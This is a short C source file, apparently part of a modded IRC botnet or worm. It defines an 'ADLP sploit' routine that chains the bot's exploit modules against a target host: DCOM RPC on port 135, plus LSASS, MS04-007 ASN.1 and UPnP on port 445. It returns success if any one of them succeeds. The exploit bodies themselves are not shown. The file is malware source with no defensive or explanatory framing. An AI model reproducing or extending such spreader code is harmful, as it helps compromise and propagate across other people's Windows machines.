//
// ADLP sploit [ modded dcass]

#include "../includes/includes.h"
#include "../includes/functions.h"
#include "../includes/extern.h"

#ifndef NO_ADLP
BOOL ADLP(EXINFO exinfo)
{
	exinfo.port = 135;
	BOOL bDCOM = dcom(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);
	exinfo.port = 445;
	BOOL bASN = MS04_007_MSASN1_PortedByScriptGod(exinfo);
	exinfo.port = 445;
	BOOL bPNP = UPNP(exinfo);

	return bDCOM || bLSASS || bASN || bPNP ? TRUE : FALSE;
}
#endif
